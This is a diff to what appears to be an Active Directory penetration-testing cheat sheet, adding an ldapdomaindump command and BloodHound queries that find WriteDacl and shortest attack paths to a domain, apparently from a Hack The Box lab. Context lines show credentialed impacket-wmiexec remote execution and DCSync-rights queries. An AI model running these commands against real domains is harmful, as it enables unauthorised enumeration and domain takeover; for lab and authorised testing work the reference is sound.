@@ -53,6 +53,9 @@ impacket-wmiexec {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{DC_IP}}
 
 # BloodHound collection from Linux (no Windows box needed)
 sudo bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -ns {{DC_IP}} -d {{DOMAIN}} -c all
+
+# Ldap domain dump
+ldapdomaindump ldaps://{{DC_IP}} -u '{{DOMAIN}}\{{USERNAME}}' -p '{{PASSWORD}}'
 ```
 
 ---
@@ -306,6 +309,8 @@ MATCH (u {owned:true})-[:AdminTo]->(c:Computer) RETURN u,c       -- boxes owned 
 MATCH (u {owned:true})-[:DCSync|GetChanges|GetChangesAll]->(d:Domain) RETURN u  -- DCSync rights
 MATCH (c:Computer) WHERE c.unconstraineddelegation=true RETURN c -- unconstrained delegation
 MATCH (u:User) WHERE u.admincount=true RETURN u                  -- protected/admin-tagged users
+MATCH p=()-[:WriteDacl]->(d:Domain) RETURN p
+MATCH (u:User {name:"SVC-ALFRESCO@HTB.LOCAL"}) MATCH (d:Domain {name:"HTB.LOCAL"}) MATCH p=shortestPath((u)-[*1..]->(d)) RETURN p
 
 -- who can TAKE OVER a target object (e.g. "who has GenericAll over Domain Admins")
 MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddMember*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p
